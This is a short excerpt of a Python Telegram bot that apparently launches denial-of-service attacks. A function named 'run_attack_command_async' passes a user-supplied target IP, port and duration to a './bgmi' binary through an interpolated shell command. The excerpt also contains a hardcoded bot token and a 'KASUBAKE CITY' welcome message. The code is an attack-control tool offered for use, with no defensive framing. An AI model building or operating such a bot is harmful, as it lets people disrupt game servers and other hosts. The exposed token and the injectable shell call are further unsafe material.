...
TOKEN = '7312718495:AAG6cRKXiw6MC27mey3-ZvGOhVCwJ4Vs0HQ'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 677")
...
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO KASUBAKE CITY!* 🎉\n\n"
